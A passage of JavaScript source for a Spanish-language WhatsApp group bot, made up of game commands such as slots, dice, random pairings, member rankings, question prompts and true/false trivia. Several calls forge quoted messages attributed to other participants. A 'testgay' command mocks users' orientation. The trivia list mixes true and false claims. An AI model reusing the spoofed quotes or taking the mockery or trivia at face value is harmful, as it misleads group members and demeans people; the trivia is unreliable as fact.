            teslagod.sendMessage(from, `${bot}`, text, {quoted: { key: { fromMe: false, participant: `${mentioned}`, ...(from ? { remoteJid: from } : {}) }, message: { conversation: `${target}` }}})
            break
case 'tragamoneda':
					if (isBaneado) return
if (!isDiversion) return
if (!isGroup) return reply(idiomas.group())
            if (!isRegistrado && !autonomo) return reply(idiomas.reg1(prefix))
const sotoy = [
		'🍊 : 🍒 : 🍐',
		'🍒 : 🔔 : 🍊',
		'🍊 : 🍋 : 🔔',
		'🔔 : 🍒 : 🍐',
		'🔔 : 🍒 : 🍊',
        '🍊 : 🍋 : 🔔',		
		'🍐 : 🍒 : 🍋',
		'🍇 : 🍇 : 🍇',
		'🍊 : 🍒 : 🍐',
		'🍒 : 🔔 : 🍊',
		'🍊 : 🍋 : 🔔',
		'🔔 : 🍒 : 🍐',
		'🔔 : 🍒 : 🍊',
        '🍊 : 🍋 : 🔔',		
		'🍐 : 🍒 : 🍋',
		'🍐 : 🍐 : 🍐',
		'🍊 : 🍋 : 🔔',
		'🔔 : 🍒 : 🍐',
		'🔔 : 🍒 : 🍊',
        '🍊 : 🍋 : 🔔',		
		'🍐 : 🍒 : 🍋',
		'🍊 : 🍒 : 🍒',
		'🔔 : 🔔 : 🍇',
		'🍌 : 🍒 : 🔔',
		'🍐 : 🔔 : 🔔',
		'🍊 : 🍋 : 🍒',
		'🍋 : 🍋 : 🍌',
		'🔔 : 🔔 : 🍇',
		'🔔 : 🔔 : 🍇',
		'🍌 : 🍒 : 🔔',
		'🍐 : 🔔 : 🔔',
		'🍊 : 🍋 : 🍒',
		'🍋 : 🍋 : 🍌',
		'🔔 : 🔔 : 🍇',
		'🔔 : 🍐 : 🍇',
		'🔔 : 🔔 : 🔔',
		'🍐 : 🍒 : 🍋',
		'🍊 : 🍒 : 🍒',
		'🔔 : 🔔 : 🍇',
		'🍌 : 🍒 : 🔔',
		'🍒 : 🍒 : 🍒',
		'🍐 : 🍒 : 🍋',
		'🍊 : 🍒 : 🍒',
		'🔔 : 🔔 : 🍇',
		'🍌 : 🍒 : 🔔',
		'🍌 : 🍌 : 🍌'
		]
            const somtoy = sotoy[Math.floor(Math.random() * sotoy.length)]
            teslagod.sendMessage(from, `[🎰 *TRAGAMONEDAS*🎰]
*-----------------*
*===========*
🍊 : 🍌 : 🍐
${somtoy} *<====*
🍇 : 🔔 : 🍒
*===========*
*-----------------*
[🎰Prueba tu suerte🎰]`, text, { quoted: mek })
            break
case 'dados':
                   if (isBaneado) return
if (!isDiversion) return
if (!isGroup) return reply(idiomas.group())
            if (!isRegistrado && !autonomo) return reply(idiomas.reg1(prefix))
					const dadus = ["⚀","⚁","⚂","⚃","⚄","⚅"]
dadu = dadus[Math.floor(Math.random() * dadus.length)]
dador = fs.readFileSync('./multimedia/misstks/sticker/'+dadu+'.webp')
teslagod.sendMessage(from, dador, sticker, {quoted: mek})
break
					case 'dado':
					if (isBaneado) return
if (!isDiversion) return
if (!isGroup) return reply(idiomas.group())
            if (!isRegistrado && !autonomo) return reply(idiomas.reg1(prefix))
					kapankah = body.slice(1)
					const elu2 =['⚁','⚀','⚄','⚂','⚅','⚃']
					const ule2 = elu2[Math.floor(Math.random() * elu2.length)]
					teslagod.sendMessage(from, ule2, text, { quoted: mek })
					break
					case 'da2':
					if (isBaneado) return
if (!isDiversion) return
if (!isGroup) return reply(idiomas.group())
            if (!isRegistrado && !autonomo) return reply(idiomas.reg1(prefix))
					kapankah = body.slice(1)
					const elu3 =['⚀\n      ⚁','⚀\n      ⚂','⚀\n      ⚃','⚀\n      ⚄','⚀\n      ⚅','⚀\n      ⚀','⚁\n      ⚁','⚁\n      ⚂','⚁\n      ⚃','⚁\n      ⚄','⚁\n      ⚅','⚁\n      ⚀','⚂\n      ⚁','⚂\n      ⚂','⚂\n      ⚃','⚂\n      ⚄','⚂\n      ⚅','⚂\n      ⚀','⚃\n      ⚁','⚃\n      ⚂','⚃\n      ⚃','⚃\n      ⚄','⚃\n      ⚅','⚃\n      ⚀','⚄\n      ⚁','⚄\n      ⚂','⚄\n      ⚃','⚄\n      ⚄','⚄\n      ⚅','⚅\n      ⚀','⚅\n      ⚁','⚅\n      ⚂','⚅\n      ⚃','⚅\n      ⚄','⚅\n      ⚅','⚅\n      ⚀']
					const ule3 = elu3[Math.floor(Math.random() * elu3.length)]
					teslagod.sendMessage(from, ule3, text, { quoted: mek })
					break
case 'emparejar':
					if (isBaneado) return
if (!isDiversion) return
if (!isGroup) return reply(idiomas.group())
            if (!isRegistrado && !autonomo) return reply(idiomas.reg1(prefix))
                    reply(idiomas.boda(pushname))
					jds = []
					const jdii = groupMembers
					const koss = groupMembers
					const akuu = jdii[Math.floor(Math.random() * jdii.length)]
					const diaa = koss[Math.floor(Math.random() * koss.length)]
					teks = ` ❑ *Pareja formada* : \n\n ┏─━─━─━∞◆∞━─━─━─┓\n@${akuu.jid.split('@')[0]} ❤️ @${diaa.jid.split('@')[0]} \n ┗─━─━─━∞◆∞━─━─━─┛`
					jds.push(akuu.jid)
					jds.push(diaa.jid)
					setTimeout( () => {
					mentions(teks, jds, true)
					}, 800)
					vivannn = fs.readFileSync(`./multimedia/sonidos/audishitxd/willy.m4a`)
					setTimeout( () => {
				teslagod.sendMessage(from, vivannn, audio, { mimetype: 'audio/mp4',  quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg", "caption": `Esto fue posible gracias a ${pushname}`, "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=", "fileLength": "28777", "height": 1080, "width": 1079, "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=", "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=", "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69", "mediaKeyTimestamp": "1610993486", "jpegThumbnail": fs.readFileSync('multimedia/imagenes/milogohd.jpg')} } }, mek, ptt: true })
				}, 1000)
					break
case 'top5':
					if (isBaneado) return
if (!isDiversion) return
if (!isGroup) return reply(idiomas.group())
            if (!isRegistrado && !autonomo) return reply(idiomas.reg1(prefix))
if (args.length < 1) return reply(idiomas.toper())
                    tagxd = body.slice(6)
					jds = []
					const jdiai = groupMembers
					const koses = groupMembers
					const jdiii = groupMembers
					const kosss = groupMembers
					const jdiiu = groupMembers
					const akuau = jdiai[Math.floor(Math.random() * jdiai.length)]
					const dieaa = koses[Math.floor(Math.random() * koses.length)]
					const akuaua = jdiii[Math.floor(Math.random() * jdiii.length)]
					const diaaa = kosss[Math.floor(Math.random() * kosss.length)]
					const ekuau = jdiiu[Math.floor(Math.random() * jdiiu.length)]
					teks = ` *TOP 5 ${tagxd}* : \n\n✵  :･ﾟ✧ :･ﾟ✵ *:･ﾟ✧:･ﾟ✵\n\n▪︎ @${akuau.jid.split('@')[0]} \n\n▪︎ @${dieaa.jid.split('@')[0]} \n\n▪︎ @${akuaua.jid.split('@')[0]} \n\n▪︎ @${diaaa.jid.split('@')[0]} \n\n▪︎ @${ekuau.jid.split('@')[0]} \n\n✵  :･ﾟ✧ :･ﾟ✵ *:･ﾟ✧:･ﾟ✵\n\n` + idiomas.toper2(pushname)
					jds.push(akuau.jid)
					jds.push(dieaa.jid)
					jds.push(akuaua.jid)
					jds.push(diaaa.jid)
					jds.push(ekuau.jid)
					mentions(teks, jds, true)
					break
case 'top10':
					if (isBaneado) return
if (!isDiversion) return
if (!isGroup) return reply(idiomas.group())
            if (!isRegistrado && !autonomo) return reply(idiomas.reg1(prefix))
if (args.length < 1) return reply(idiomas.toper())
if (OnOffLine === true) return reply(idiomas.sinnet())
                    reply(idiomas.waittt())
                    tagxd2 = body.slice(7)
					jds = []
					const jdiai1 = groupMembers
					const koses2 = groupMembers
					const jdiii3 = groupMembers
					const kosss4 = groupMembers
					const jdiiu5 = groupMembers
					const gaea6 = groupMembers
					const gozu7 = groupMembers
					const albaf8 = groupMembers
					const teru9 = groupMembers
					const miowo0 = groupMembers
					const akauau = jdiai1[Math.floor(Math.random() * jdiai1.length)]
					const dieaua = koses2[Math.floor(Math.random() * koses2.length)]
					const aakuaua = jdiii3[Math.floor(Math.random() * jdiii3.length)]
					const ediaaa = kosss4[Math.floor(Math.random() * kosss4.length)]
					const aekuau = jdiiu5[Math.floor(Math.random() * jdiiu5.length)]
					const aku2au = gaea6[Math.floor(Math.random() * gaea6.length)]
					const die3aa = gozu7[Math.floor(Math.random() * gozu7.length)]
					const aku4aua = albaf8[Math.floor(Math.random() * albaf8.length)]
					const dia5aa = teru9[Math.floor(Math.random() * teru9.length)]
					const ek6uau = miowo0[Math.floor(Math.random() * miowo0.length)]
					teks = ` *TOP 10 ${tagxd2}* : \n\n|= ✧ = ✵ |  ¥  | ✵ = ✧ =|\n\n_1.º @${akauau.jid.split('@')[0]}_ \n\n_2.º @${dieaua.jid.split('@')[0]}_ \n\n_3.º @${aakuaua.jid.split('@')[0]}_ \n\n_4.º @${ediaaa.jid.split('@')[0]}_ \n\n_5.º @${aekuau.jid.split('@')[0]}_ \n\n_6.º @${aku2au.jid.split('@')[0]}_ \n\n_7.º @${die3aa.jid.split('@')[0]}_ \n\n_8.º @${aku4aua.jid.split('@')[0]}_ \n\n_9.º @${dia5aa.jid.split('@')[0]}_ \n\n_10.º @${ek6uau.jid.split('@')[0]}_ \n\n|= ✧ = ✵ |  ¥  | ✵ = ✧ =|`
					jds.push(akauau.jid)
					jds.push(dieaua.jid)
					jds.push(aakuaua.jid)
					jds.push(ediaaa.jid)
					jds.push(aekuau.jid)
					jds.push(aku2au.jid)
					jds.push(die3aa.jid)
					jds.push(aku4aua.jid)
					jds.push(dia5aa.jid)
					jds.push(ek6uau.jid)
					setTimeout( () => {
					mentions(teks, jds, true)
					}, 3500)
					TeslApi = await getBuffer(`https://pastebin.com/raw/qTa60Avh`)
             jsoData = JSON.parse(TeslApi)
             rndIndex = Math.floor(Math.random() * jsoData.length);
             randKey = jsoData[rndIndex]
             nkpttx = await getBuffer(randKey.resulptt2)
             teslagod.sendMessage(from, nkpttx, MessageType.audio, {quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg", "caption": `Top10 ${tagxd2}\n>Gracias Por Ver<`, "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=", "fileLength": "28777", "height": 1080, "width": 1079, "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=", "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=", "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69", "mediaKeyTimestamp": "1610993486", "jpegThumbnail": fs.readFileSync('./multimedia/imagenes/milogohd.jpg')} } },mek, mimetype: 'audio/mp4', ptt:true})
					break
case 'testgay':
				    if (isBaneado) return
if (!isDiversion) return
if (!isGroup) return reply(idiomas.group())
            if (!isRegistrado && !autonomo) return reply(idiomas.reg1(prefix))
				reply(idiomas.analice())
				    try {
					const ab =['2%', '3%', '4%', '5%', '6%', '7%', '8%', '9%', '*No eri gei* 😎👌', '10%', '11%', '12%', '15%', '13%', '14%', '16%', '26%', '27%', '18%', '20%', '61%', '62%', '63%', '64%', '65%', '66%', '67%', '68%', '69.99%', '22%', '23%', '*[ ! ]Limite de gay superado [ ! ]* 😳', '71%', '72%', '73%', '31%', '32%', '33%', '34%', '35%', '36%', '37%', '38%', '39.99%', '74%', '75%', '76%', '77%', '78%', '79.99%', '1%', '97%', '5%', '93%', '8%', '90%', '10%', '89%', '15%', '85%', '17%', '83%', '19%', '80%', '21%', '24%', '76%', '77%', '25%', '74%', '81%', '82%', '83%', '41%', '42%', '43%', '44%', '45%', '46%', '47%', '48%', '49.99%', '84%', '85%', '86%', '87%', '88%', '89.99%', '28%', '70%', '32%', '69%', '35%', '65%', '37%', '63%', '40%', '60%', '41%', '59%', '43%', '44%', '57%', '47%', '49%', '51%', '54%', '56%', '57%', '91%', '92%', '51%', '52%', '53%', '54%', '55%', '56%', '57%', '58%', '59.99%', '93%', '94%', '95%', '96%', '97%', '98%', '99.99%', '100%', '200%', '300%', '400%', '500%', '600%', '700%', '800%', '900%', '999999999.9%', 'Mr. Gey', 'Super gey']
					const be = ab[Math.floor(Math.random() * ab.length)] 
					buffer = fs.readFileSync(`./multimedia/imagenes/milogo.jpg`)
					teslagod.sendMessage(from, buffer, image, { quoted: mek, caption:`*🏳‍🌈 | Test gay*\n${pushname} su porcentaje de gay es de `+be +` `, thumbnail: fs.readFileSync('./multimedia/imagenes/milogo.jpg'), sendEphemeral: true}) 
					resultgei = fs.readFileSync(`./multimedia/sonidos/audishitxd/audigeyxd.m4a`)
            teslagod.sendMessage(from, resultgei, MessageType.audio, {quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg", "caption": `${pushname} es ${be} gay`, "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=", "fileLength": "28777", "height": 1080, "width": 1079, "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=", "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=", "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69", "mediaKeyTimestamp": "1610993486", "jpegThumbnail": fs.readFileSync('./multimedia/imagenes/milogo.jpg')} } },mek, mimetype: 'audio/mp4', ptt:true})
					} catch {
  reply(`tan gey que el bot c bugea`)
}
					break
case 'preguntame':
		if (isBaneado) return
if (!isDiversion) return
if (!isGroup) return reply(idiomas.group())
            if (!isRegistrado && !autonomo) return reply(idiomas.reg1(prefix))
		const pregunta =['¿Crees que las amistades son para siempre?', '¿Hasta qué punto llegarías por conseguir fama?', '¿Qué te frustra más no haber conseguido?', '¿Qué talento desearía tener?', '¿Cómo definirías tu tipo de sentido del humor?', '¿Qué tipo de personas son más atractivas para ti?', '¿Quién te ha influenciado más en esta vida?', '¿Con qué personaje de ficción te identificas más?', '¿Cuál ha sido tu mejor momento de tu vida?', '¿Qué es lo que echas más de menos de tu infancia?', '¿Quién es la persona más importante de tu vida?', '¿Qué tipo de música te gusta más?', 'Si te hicieras un tatuaje, ¿de qué se trataría?', '¿Qué es lo que más deseas en este mundo?', '¿Cuál es tu película favorita? ¿Por qué?', '¿Cuál es el recuerdo más vergonzoso de tu infancia?', '¿Qué comerías en tu última cena?', '¿Hay alguna prenda de ropa que no te pondrías nunca?', '¿Qué superpoder tendrías si pudieras elegir?', 'Si dominaras el mundo, ¿qué harías para cambiarlo?', '¿Tienes algún libro favorito? ¿Cuál es?', '¿Cuál sería tu trabajo soñado?', '¿Tienes algún secreto que no me hayas contado?', '¿Alguna vez te has descargado una app para ligar?', '¿Te has sentido atraído hacia una hermana (o hermano) de un amigo/a?', '¿Quieres más a tu perro (o gato) que a algún otro miembro de tu familia?', '¿Qué tipo de personas te asustan más?', '¿Qué es lo más extraño que has hecho por comer algo que te apetecía?', 'Si te gastaran una broma pesada, ¿cómo te vengarías?', '¿Cómo sería un día perfecto para ti?', 'Si pudieses saber sólo una cosa del futuro, ¿qué preguntarías?', 'Si fueras un fantasma que habita una casa encantada, ¿Cómo atraerías a la gente dentro?', '¿Qué es lo que te pone más nervioso?', '¿Cuál es el momento en el que te has sentido más sexy a lo largo de tu vida?', '¿Qué harías si te diera un ataque de risa en una situación inapropiada o en lugar del que no puedes salir?', '¿Qué es lo más vergonzoso que te han atrapado haciendo?', '¿A quién querrías ver desnudo/a y a quién odiarías ver así?', 'Si te tuvieras que poner un nombre a ti mismo, ¿cuál sería?', '¿Qué animal te gustaría ser y por qué?', '¿Qué harías si ganaras la lotería?', 'Si pudieses intercambiar tu vida con alguien, ¿con quién sería?', '¿Cómo harías reír a alguien?', '¿Qué parte de tu cuerpo te gusta más y por qué?', '¿Qué es lo más loco que has hecho por amor?', 'Si pudieras encerrar a alguien de por vida, ¿a quién sería?', '¿Qué harías si un/a desconocido/a te besara en plena calle?', '¿Cuál ha sido el sueño más extraño que has tenido nunca?', '¿En qué época te hubiese gustado vivir?', '¿Qué superpoder querrías tener?', 'Si tuvieras diez segundos para un deseo, ¿qué pedirías?', '¿Sin cuál de los cinco sentidos podrías vivir?', 'Si pudieras cenar con cualquier personaje histórico, ¿a quién elegirías?', 'Si te dijesen que eres inmortal y que ninguno de tus actos va a ser castigado, ¿qué sería lo primero que harías?', 'Si fueses capaz de cambiar algo en el mundo... ¿qué cambiarías?', 'Si pudieras viajar en el tiempo, ¿viajarías al pasado o al futuro?', '¿Qué querías ser de adulto cuando eras niño?', 'Si fueras un producto, ¿cuál sería tu nombre?', '¿Por qué crees que te pusieron tu nombre?', '¿crees que es peligroso comer halgo que cayo al suelo?', 'Si los seres humanos crecemos a partir de aprender de nuestros errores, ¿por qué tenemos miedo a fallar?', '¿Qué es lo que haces por la noche cuando no puedes dormir?', '¿Cómo crees que vas a ser como pareja?', '¿Qué crees que es lo que te impide ser completamente feliz?', '¿Qué es lo que más miedo te da?', 'Si tuvieras suficiente dinero como para que no tener que trabajar nunca, ¿en qué te dedicarías en tu tiempo libre?', '¿Cómo cambiarías el mundo si pudieras?', 'Si pudieras convertirte en famoso, ¿qué te gustaría que fuera lo que te hiciera famoso?', 'Si pudieras viajar tres años atrás en el tiempo, ¿qué consejo te darías a ti mismo?', 'Piensa en la peor cosa que te haya ocurrido en toda tu vida. ¿Qué aprendiste sobre ello?', '¿Crees que el dinero ayuda a comprar la felicidad?', '¿Cómo le explicarías la palabra “amor” a alguien sin usar la palabra “amor”?', '¿Cómo describirías un día perfecto desde que te levantas hasta que te acuestas?', '¿Qué has aprendido en tu vida que consideras que te va a ser lo más útil?', 'Si pudieras vivir en cualquier lugar del mundo, ¿dónde sería?', 'Imagina que eres el presidente y necesitas escoger a tres personas para que te ayuden: ¿cuáles serían y por qué?', 'Si pudieras hacer un regalo a cada persona del mundo pero solo pudiera ser el mismo, ¿cuál sería?', 'Si pudieras tener un solo superpoder, ¿cuál sería?', '¿Preferirías ser el jefe o un empleado?', '¿Qué preferirías: 1.000.000 € hoy mismo o 1 céntimo duplicado cada día durante 30 días?', '¿Crees que los de tu generación son realmente diferentes a cómo son las otras generaciones?', '¿Cómo crees que se acabará el mundo?', '¿Hay algo de tu cuerpo con lo que no te sientas a gusto?', '¿Qué es lo que más te motiva?', '¿Cómo de masculino o femenino te sientes?', '¿Crees que los alienígenas existen?', '¿Qué series te gusta ver?', '¿Quién es tu profesor favorito y cuál es el que peor te cae?', '¿Quién me dirías que es tu mejor amigo?', '¿Cuál crees que es la cosa más vergonzosa que ha hecho tu padre o madre?', '¿Dónde te gustaría vivir?', '¿En qué lugar transcurrirían tus vacaciones perfectas?', '¿Me puedes describir tu dormitorio?', '¿A qué personaje histórico te gustaría entrevistar?', '¿Qué tipo de ropa no llevarías puesta en ningún caso?', '¿Cuáles son tus tres bandas de música favoritas?']
		const random = pregunta[Math.floor(Math.random() * (pregunta.length))]
  	
			   hasil = `*${pushname}* \n\n>>> _*${random}*_ <<< `
			   reply(hasil)
			   break
case 'v_o_f':
		if (isBaneado) return
if (!isDiversion) return
if (!isGroup) return reply(idiomas.group())
            if (!isRegistrado && !autonomo) return reply(idiomas.reg1(prefix))
		const trivia =['Ramses II es considerado el faraon con el reinado mas largo del antiguo egipto', 'Se cree que la via lactea contiene mas materia oscura que andromeda la galaxia mas grande del grupo local', 'Brasil dubuto en waterpolo en los juegos olimpicos de verano de 1932', 'Entre 1900 y 1920 el juego de la soga era un juego olimpico', 'En japon se considera mala suerte dejar que un luchador de sumo haga llorar a tu bebe', 'La cobra de cuello negro rocia veneno en los ojos de su victima para causar ceguera', 'Es imposible estornudar con los ojos abiertos', 'La persona promedio sueña solo una vez durante la noche', 'El núcleo del sujeto puede no aparecer en la frase', 'Todas las palabras esdrújulas llevan tilde', 'Las palabras graves están acentuadas en la última sílaba', 'Todas las palabras agudas llevan tilde', 'Egipto se encuentra al Noreste de África', 'Colombia limita con Ecuador, Surinam, Bolivia y Perú', 'La capital de Corea del Norte es Seúl', 'Mg2O es óxido de magnesio', 'Fe2O3 es óxido de hierro', 'NaCl es cloruro de sodio', 'O3 es oxígeno', 'CO2 es dióxido de carbono', 'El koala es un oso', 'La flor es un órgano reproductor de las plantas', 'Las arañas son insectos', 'Los líquenes son la unión simbiótica de un hongo y un alga', 'Existen animales autótrofos', 'Solo hay 2 generos para calificar a los seres humanos', 'El planeta tierra es plana', 'El humano moderno evolucionó de una especie animal anterior', 'Los antibióticos matan virus y bacterias', 'Un gen paterno es el que determina que el bebé sea niño o niña', 'El Universo se inició con una gran explosión', 'Los láseres son una emisión de ondas de sonido', 'los electrones son más pequeños que los átomos', 'La radioactividad es de origen humano', 'Los continentes llevan millones de años moviéndose y siguen moviéndose', 'El centro de la Tierra está muy caliente', 'El hipopótamo es el gran animal que más muertes causa en África', 'Comer un pescado japonés puede matarte si no está bien preparado', 'Algunos japoneses sufren una enfermedad mental al visitar París', 'Los viajes largos en avión pueden causar trombos en las piernas y la aspirina lo previene', 'Los remolinos de agua giran en sentido contrario en los dos hemisferios', 'Es imposible que las pirámides de Egipto fueran construidas por seres humanos', 'Los agujeros negros nunca mueren', 'Los planetas pueden vagar por el espacio sin una estrella madre', 'La Voyager 1 ha viajado más lejos en el espacio que cualquier objeto creado por humanos', 'El volcán más grande del sistema solar se encuentra en la Luna', 'Es muy poco frecuente que las galaxias choquen e interactúen unas con otras', 'En Venus todas las formaciones tienen nombre de mujer', 'Si se perforara tu traje espacial mientras te encuentras en el vacío del espacio, podrías sobrevivir al menos 3 o 4 minutos', 'El público general se enteró de los peligros de las sustancias radiactivas gracias a las chicas del radio', 'El satélite de Saturno Mimas también se conoce como Estrella de la muerte', 'La luna Calisto es mitad negra y mitad blanca', 'El mejor planeta para conseguir un bronceado de verdad y duradero es Mercurio', 'Los acantilados más elevados del sistema solar están precisamente en la Tierra', 'Aristarco de Samos fue la primera persona conocida que propuso el modelo heliocéntrico del sistema solar', 'La materia ordinaria es el elemento más abundante del cosmos', 'El cometa Halley no volverá a visitarnos hasta el 2041', 'Las nubes en el centro de la Vía Láctea huelen a ron saben a frambuesas y están llenas de alcohol', 'El viento solar es una corriente de partículas energéticas expulsadas por el Sol', 'Nigeria está en el hemisferio sur', 'Existen mas de 3 dimensiones en nuestro universo', 'Una división entera es aquella en la que el resto es cero', 'las plantas se reproducen', 'Todos los animales invertebrados son ovíparos', 'Las plantas elaboran su propio alimento a través de la fotosíntesis', 'SixDegrees fue la primera red social que se creó', 'El aguacate es una hortaliza', 'Instagram es la red social más usada del mundo', 'en un teclado, al lado de la letra Ñ, se encuentra la letra K', 'Marie Curie falleció de leucemia a causa de su contacto con sustancias radioactivas', 'El nitrógeno es el elemento químico más abundante en la atmósfera', 'Abraham fue quien impulsó la migración hebrea hacia Canaán', 'Miguel Indurain fue el ciclista más joven en vestir el jersey de líder en la Vuelta Ciclista a España', 'Ofelia era el amor de Hamlet', 'Los holandeses introdujeron en España los molinos de viento', 'Machu Picchu se encuentra en peru', 'El Museo del Prado es la pinacoteca más grande de España', 'Albert Einstein dijo que la cuarta guerra mundial se lucharía con piedras', 'Paul McCartney era el miembro más joven de los Beatles', 'La India fue el primer país en utilizar el papel lo hicieron cien años después de la muerte de Cristo', 'el francés es el idioma oficial de Andorra', 'Gengis Kan fue un guerrero mongol que se convirtió en emperador de China', 'Francia es el segundo país más grande de Europa', 'En el parchís tradicional se utilizan 20 fichas como máximo', 'Escocia tiene a la flor del cardo por símbolo', 'En la playa normanda de Grandville están prohibidos los elefantes', 'Un buitre chocó contra un avión a una altitud de 11.300 metros', 'Todos los insectos tienen seis patas', 'Mark Zuckerberg es daltónico El fondo de Facebook es azul porque es el color que puede distinguir mejor', 'Si tiras un céntimo desde lo alto de un rascacielos puedes atravesarle el cráneo a alguien', 'La mayoría de los seres humanos utilizamos solamente el 10% de nuestro cerebro a menudo se sugiere que mediante algunos procesos una persona puede ser capaz de aprovechar ese potencial no utilizado', 'La principal limitación de las neuronas de nuestro cerebro es que si son dañadas no tienen la posibilidad de regenerarse', 'Cuando un avión aterriza de noche se apagan todas sus luces interiores', 'Las huellas dactilares suelen estar determinadas por nuestros genes, así que pueden tener ciertas semejanzas con las de nuestros progenitores', 'Durante su vida, un hombre con una alimentación normal puede ingerir una cantidad de alimentos equivalente al peso de cien elefantes adultos', 'Nunca se ha visto a un elefante saltando en vertical', 'La Gran Muralla China es la única obra construida por el hombre visible a simple vista desde el espacio', 'En los hogares españoles hay más pájaros que gatos', 'Los esquimales utilizan 226 palabras distintas para designar la nieve según su estado', 'Una tostada con mantequilla lanzada al aire cae por el lado de la mantequilla tres de cada cuatro veces', 'Los cabellos y las uñas siguen creciendo después de la muerte', 'Cuando hace mucho frío un vasito de alcohol hace entrar en calor', 'Hay arsénico en el café', 'Francia perdió la Guerra de los Cien Años', 'Las Cícladas es un lugar real', 'Guillermo Marconi en 1943 se reafirma como el inventor de la radio por encima de Nikola Tesla', 'Las moscas macho viven en promedio 5 años', 'Los asesinos en serie tienen un coeficiente intelectual inferior a la media', 'En el año 2017 se hizo el primer trasplante de cerebro de seres humanos', 'Brasil ha sido el único país latinoamericano que ha organizado unos Juegos Olímpicos', 'Una cuarta parte de los huesos del cuerpo humano se encuentran en las manos', 'En 1694 los jueces se vistieron de negro para llorar la muerte de la reina Maria II', 'La silla eléctrica fue inventada por un dentista', 'Una libélula vive aproximadamente 48 horas', 'Al nacer tenemos 300 huesos pero de adulto solo tenemos 206', 'La jirafa es el único mamífero que no produce sonido alguno', 'No puedes puedes tocar la punta de tu nariz con la lengua', 'No puedes lamer tu codo con la lengua', 'Usas tiktok', 'La Tierra pesa alrededor de 6.588.000.000.000.000.000.000.000.000.000.000.000 toneladas', 'Los perros y los gatos no pueden ser diestros o zurdos como los humanos', '*Ella no te ama*', 'Un hombre llamado Charles Osborne tuvo hipo durante 69 años', 'Los conejillos de indias no pueden oler la menta', 'Debido a que el metal escaseaba los premios Oscar otorgados durante la Segunda Guerra Mundial eran de yeso', 'Uno de los anillos de Saturno es polvo de plata casi pura', 'Todos los cisnes de Inglaterra pertenecen a la Reina', 'La letra J es la única que no aparece en la tabla periódica', 'Hay un patrón dentro de su párpado superior que es tan único como su huella digital', 'Si un humano y un perezoso tuvieran que medir fuerzas con los brazos el perezoso ganaría sin duda', 'Todos los pandas del mundo pertenecen a China', 'Nueva York es la Gran Manzana mientras que Manhattan Kansas es la Pequeña Manzana', 'Las medusas tienen 3 corazones', 'La miel nunca se caduca Aunque pasen siglos sigue siendo comestible', 'Los toros odian el color rojo', 'Thomas Alba Edison tenía miedo a la oscuridad', 'Siglo XXI donde la contaminación ya no tiene solución', 'Cada día producimos más de un litro de saliva', 'Los delfines duermen con un ojo abierto', 'Tenemos alrededor de 100.000 pelos en la cabeza', 'La comida que cae al suelo no se contamina si se recoge antes de 5 segundos', 'Las personas tienen más probabilidades de ser contratadas si usan gafas para la entrevista', 'No hay moscas en la Antártida', 'Rusia es el país con más fumadores en el mundo', 'Neil Armstrong fue el primer humano en pisar la luna', 'El everest es la montaña mas alta del mundo', 'Una persona nunca lograra sus sueños', 'La pantalla de un móvil tiene 18 veces más bacterias que un baño público', 'Los surdos estan sordos', 'Tienes más probabilidades de que te toque la lotería que de que te caiga un rayo encima', 'En la actualidad el número de personas en el planeta tierra son 7 Mil millones aproximadamente', 'El sistema solar tiene 12 planetas', 'Los pansexuales son amantes de los panes', 'Los necrofilos son amantes del color negro', 'Hasta el siglo XIX los zapatos izquierdo y derecho eran iguales', 'Las huellas dactilares de los hijos se parecen a las de sus padres', 'El nombre completo de Picasso era\nPablo Diego José Francisco de Paula Juan Nepomuceno María de los Remedios Cipriano de la Santísima Trinidad Ruiz y Picasso', 'Las cebras son negras con rallas blancas', 'Cada año se imprime más dinero de Monopoly que dinero real en todo el mundo', 'El hombre es el animal más rápido sobre dos patas', 'El cuello de la jirafa tiene el doble de huesos que el nuestro', 'Las tortugas pueden llegar a vivir más de 500 años', 'En la cara oculta de la luna es siempre de noche', 'Hay una ciudad llamada Roma en cada continente', 'El cerebro es el órgano más pesado del cuerpo humano', 'Napoleón era bajo de estatura', 'Los Ángeles es la segunda ciudad del mundo con más mexicanos', 'la Antártida es el único continente sin serpientes', 'Los relojes con números romanos muestran el número 4 como IIII en lugar de IV', '1 La jirafa es el único mamífero que no tiene cuerdas vocales', 'El perezoso es el animal más dormilón', 'Los conejos son roedores', 'El ojo del avestruz es mas grande que su cerebro', 'segun la tabla periódica H2O es awa']
		const randrom = trivia[Math.floor(Math.random() * (trivia.length))]
sendButMessage(from, `${randrom}`, `Matt_M ✓`,
[{
